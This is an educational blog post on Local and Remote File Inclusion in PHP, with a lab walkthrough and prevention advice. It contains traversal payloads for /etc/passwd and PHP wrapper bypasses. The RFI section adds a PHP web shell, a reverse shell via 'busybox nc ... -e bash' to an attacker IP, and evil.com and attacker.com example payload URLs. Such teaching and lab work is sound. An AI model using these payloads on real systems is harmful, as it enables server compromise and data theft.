---
title: File Inclusion
Date: 2024-10-11
image: avatar.png
autoimage: yes
description: Dexter
Categories: Web Security
author: Dexter
comments: true

---
In web application security, vulnerabilities come in many forms including Local File Inclusion. LFI is a web vulnerability that allows attackers to include files on a server through the web browser. If exploited this can lead to sensitive information disclosure, privilege escalation or even full remote code execution.

In this blog post we will explore what LFI is, how it works, and how attackers exploit it. We will also discuss steps developers and security proffessionals can take to mitigate the risk.

## Introduction

Local File Inclusion is a vulnerability that allows an attacker to include a file mostly by exploiting a dynamic file inclusion mechanism implemented on the target. The vulnerability occurs due to the use of user supllied input without proper validation. This means that an attacker is allowed to include files on a server through a web browser and allows the attacker to manipulate the input and inject path traversal charachters and include other files from the web server. In other cases an attacker might be able to write arbitiary files on the server allowing the modification of application data or behaviour and full control of the server.

All this can lead to something as outputting the file contents, but depending on the severity, it can also lead to:
1. code execution on the web server.
2. code execution on the client-side such as javascript which can also lead to other forms of attacks like cross site scripting (xss)
3. Denial of service (DOS)
4. Sensitive Information Disclosure

Although most examples point to vulnerable PHP scripts, we should also keep in mind that it is also common in other technologies such as JSP.
The following is an example of PHP code vulnerable to Local File inclusion.
```php
    <?php
    $file = $_GET[‘file’];

    if(isset($file))

    {

    include(“pages/$file”);

    }

    else
    {
    include(“index.php”);
    }
    ?>
```
Can you spot the vulnerability? No worries next up let us discuss how we can identify it

## Identifying LFI vulnerabilities.

LFI vulnerabilities are easy to identify and exploit. Since LFI occurs when paths posted to include statements are not properly sanitized, we should look for scripts which take filenames as parameters. Using our example code above we can see that it uses *file* as a parameter thus vulnerable to LFI.This would looks something like this one the web browser `http://example/preview.php?file=example.html`.
An attacker would attempt to exploit this vulnerability by manipulating the file location parameter such as `http://example/preview.php?file=../../../etc/passwd`.
The above is an effort to display the contents of the `/etc/passwd` file on a UNIX/Linux file system and would load the passwd file.

![1](https://i.ibb.co/C9xwsKX/passwd.png)

## Examples of Techniques used.

Even when such a vulnerability exists, the exploitation could be more complex in real life scenarios. Consider the following code.

```php
<?php include($_GET['file'].".php"); ?>
```

Simple substitution with a random filename would not work as the postfix `.php` is appended to the provided input. In order to bypass that an attacker can use several techniques to get the expected exploitation.

### NULL Byte Injection.

The null character(null terminator, null byte) is a control character with the value zero present in many character sets that is being used as a reserved character to mark the end of a string. Once used any character after this special byte is ignored.
This is commonly injected using an URL encoded string *%00* by appending it to the requested path. In our previous example, performing this request to `http://example/preview.php?file=../../../etc/passwd%00`, would ignore the *.php* extension being added to the input filename and thus returns a list of basic users from the successful exploit.

### Path and Dot Trundation

Most PHP installations have a file name limit of 4096 bytes. If any given filename is longer than the length, PHP simply truncates it. This allows an attacker to abuse and move the `.php` extension out of the bytes limit.
This bypass would commonly be combined with other logical bypass strategies such as encoding part of the file with Unicode encoding.

### PHP Wrappers

Local File inclusion vulnerabilities are commonly seen as read only vulnerabilities that an attacker can use to read sensitive data from the server hosting the vulnerable application. However in some specific implementations this can be used to upgrade the attack from Local File Inclusion to Remote Code Execution(RCE).
A wrapper is a code that surrounds other code to perform some added functionality. THis sample would allow an attacker execute any command they want, by supplying it as a GET parameter.
```php
<?php system($_GET["cmd"]);?>
```

#### PHP Filter

This is used to access the local file system, this is a case sensitive wrapper that provides capability to apply filters to a stream at the time of opening a file.
The wrapper can be used like this: `php://filter/convert.base64-encode/resource=file`, where `file` is the file to retrieve. As a result the content of the target file would be able to read and encode the data to base64.

#### PHP zip
This wrapper expects the following parameter structure: `zip:///filename_path#internal_filename` where `filename_path` is the path to the malicious file and `internal_filename` is the path where the malicious file is place inside the processed ZIP file. During the exploitation, it’s common that the # would be encoded with it’s URL Encoded value `%23`.

Abuse of this wrapper could allow an attacker to design a malicious ZIP file that could be uploaded to the server, for example as an avatar image or using any file upload system available on the target website (the `php:zip://` wrapper does not require the zip file to have any specific extension) to be executed by the LFI vulnerability.

In order to test this vulnerability, the following procedure could be followed to attack the previous code example provided.

- Create the PHP file to be executed, for example with the content `<?php phpinfo(); ?>` and save it as code.php
- Compress it as a new ZIP file called `target.zip`
- Rename the `target.zip` file to `target.jpg` to bypass the extension validation and upload it to the target website as your avatar image.
- Supposing that the `target.jpg` file is stored locally on the server to the `../avatar/target.jpg` path, exploit the vulnerability with the PHP ZIP wrapper by injecting the following payload to the vulnerable URL: `zip://../avatar/target.jpg%23code` (remember that `%23` corresponds to `#`).

Since on our sample the `.php` extension is concatenated to our payload, the request to `http://example/preview.php?file=zip://../avatar/target.jpg%23code` will result in the execution of the `code.php` file existing in the malicious ZIP file.

#### PHP Data
This wrapper expects the following usage: `data://text/plain;base64,BASE64_STR` where `BASE64_STR*` is expected to be the Base64 encoded content of the file to be processed. It’s important to consider that this wrapper would only be avaliable if the option `allow_url_include` would be enabled.

In order to test the LFI using this wrapper, the code to be executed should be Base64 encoded, for example, the `<?php phpinfo(); ?>` code would be encoded as: `PD9waHAgcGhwaW5mbygpOyA/Pg==` so the payload would result as: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`.

#### PHP except
This wrapper, which is not enabled by default, provides access to proccesses `stdio,stdout and stderr`. Expecting to be used as `expect://command` the server would execute provided command on `BASH` and return a result.

## Sample Lab

So we are going to handle a challenge which involves file path traversal on portswigger and is accessible [here](https://portswigger.net/web-security/file-path-traversal/lab-simple)

### Description
Looking at the description we see that we are supposed to traverse our way to the `/etc/passwd` file

![2](https://i.ibb.co/DkBFRMr/portswigger.png)

### Analysis
Looking around the website we see images and when we click on one we can use burpsuite to capture the request made when we click on one of the products.

![3](https://i.ibb.co/RcbRmxs/capturing-request.png)

Then we can forward this request and get another request which looks like:

![4](https://i.ibb.co/5vrGrqY/forwarding-the-request.png)

Looking at the header we see that the it is using a GET request on filename. We can change the value of this to `/../../../etc/passwd` and send this request.

We then get a response with the passwd file contents. Success!

![5](https://i.ibb.co/RvGC82Q/response-with-passwd.png)


## Extras
In the main post, we explored **Local File Inclusion (LFI)**, a vulnerability where an attacker can include and access local files on the server. However, there’s a related attack called **Remote File Inclusion (RFI)** that works similarly but with a key difference—attackers can include **external files** from remote servers. This file inclusion vulnerability allows an attacker to include a file, usually exploiting a dynamic file inclusion mechanism that has been implemented in the target location. Occurring due to improper input validation.
This could then lead to file contents disclosure. Depending on the severity this could then lead to worse.
This would allow two main benefits:
- Enumerating local only ports and web apps (SSRF)
- Gaining RCE by including malicious scripts that we host ourselves

### Demonstrating LFI and RFI
To better understand how file inclusion works, we can go ahead and create a welcome page that can be exploited if not properly secured. I will be using docker to create containers locally.

```php
<?php
// RFI Vulnerability - Do NOT use in production
if(isset($_GET['page'])) {
    $include_file = $_GET['page'];
    include($include_file); // Dangerous inclusion without validation
}


#$include_file = str_replace(array("http://", "https://"), "", $include_file);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnerable Welcome Page</title>
</head>
<body>
    <h1>Welcome to Our Site!</h1>
    <p>This is a simple welcome page with an intentional RFI vulnerability.</p>

    <!-- Normal page content -->
    <div style="border: 1px solid #ccc; padding: 20px; margin: 20px;">
        <h2>About Us</h2>
        <p>We're a demo company showing PHP security concepts.</p>
    </div>

    <!-- Hidden RFI trigger (could also be in URL parameters) -->
    <!-- Normally this would be a dynamic module loader in real applications -->
    <!-- Example vulnerable URL: ?page=http://attacker.com/malicious.txt -->
</body>
</html>
```

We can also set this up using docker with a `php` image like below

```Dockerfile
#latest PHP image

FROM php:8.2-apache

## PDO
RUN apt-get update && apt-get install -y busybox python3
#RUN docker-php-ext-install pdo pdo_pgsql

## Apache mod_rewrite

#RUN a2enmod rewrite

RUN echo "allow_url_include=1" >> /usr/local/etc/php/php.ini && \
    echo "allow_url_fopen=1" >> /usr/local/etc/php/php.ini

COPY welcome.php /var/www/html/welcome.php
#COPY comment.php /var/www/html/comment.php

#WORKDIR /var/www/html

EXPOSE 80
```

![welcome.php](https://i.ibb.co/994TtXjX/image.png)


### Exploiting LFI

In our example we can add the `../../../etc/passwd` to prove that we can exploit local file inclusion in our local web application. 

![LFI](https://i.ibb.co/DDR1x2mH/image.png)

### Exploiting RFI 
To  demonstrate remote file inclusion, we can create a payload script that will allow us to execute system commands once it is included on the vulnerable server. Since `RFI` allows us to load remote files, we can host the payload on our own server and inject it into the vulnerable site.

```php
<?php

system($_GET["cmd"]);

?>
```

On our attacker machine we could start a python server by 
```python
python3 -m http.server 8001
```

Then we could add this parameter on the site

```
?page=http://192.168.226.128:8001/shell.php
```

![rfi](https://i.ibb.co/jZzJSwv6/image.png)

We can then confirm on our server that this file has been included. 

![pythonserver](https://i.ibb.co/8LDgxj6Z/image.png)

We can then try and execute commands to show that this works. 

```
?page=http://192.168.226.128:8001/shell.php&cmd=id
```

![id](https://i.ibb.co/SXMMrHFM/image.png)

And with that we have successfully exploited the `RFI` vulnerability. 
Maybe we can now try and have some fun and have the machine connect back to us and give us a shell. 
First we are gonna need to start a listener on our attacker machine that will listen to any connections back 

```
nc -lnvp 4444
```

And now we can add the following parameter to our request. The payload has been url encoded just for measure. 
```
?page=http://192.168.226.128:8001/shell.php&cmd=busybox%20nc%20192.168.226.128%204444%20-e%20bash
```

And we do get a connection back and we can work towards escalating our privileges. 

![shell](https://i.ibb.co/kgJJ8WFz/image.png)


## LFI vs RFI 

While both `LFI` and `RFI` are file inclusion vulnerabilities, they do have their distinct behaviors and risks. Here are some key differences. 

| **Feature**            | **LFI (Local File Inclusion)**                    | **RFI (Remote File Inclusion)**                 |
|------------------------|--------------------------------------------------|------------------------------------------------|
| **File Source**         | Local files on the server                        | Remote files from external URLs                |
| **Attack Method**       | Reads or executes local files                    | Loads and executes external scripts            |
| **Potential Impact**    | Information disclosure, code execution (if combined with log poisoning) | Remote Code Execution (RCE), full system compromise |
| **Example Payload**     | `vulnerable.php?page=/etc/passwd`                | `vulnerable.php?page=http://evil.com/payload.php` |
| **Works When**          | The server has important local files that can be accessed | `allow_url_include = On` (which allows remote scripts) |
| **Common Exploits**     | `/etc/passwd`, `php://filter`, `log poisoning`    | Hosting a malicious script remotely and executing it |


## How to Prevent a Directory Traversal Attack

The most effective way to prevent file path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.

If it is considered unavoidable to pass user-supplied input to filesystem APIs, then two layers of defense should be used together to prevent attacks:

- The application should validate the user input before processing it. Ideally, the validation should compare against a whitelist of permitted values. If that isn't possible for the required functionality, then the validation should verify that the input contains only permitted content, such as purely alphanumeric characters.
- After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path. It should verify that the canonicalized path starts with the expected base directory.

So that will be all. Enjoy!

## Comments

{{< chat disqus_thread >}}


---
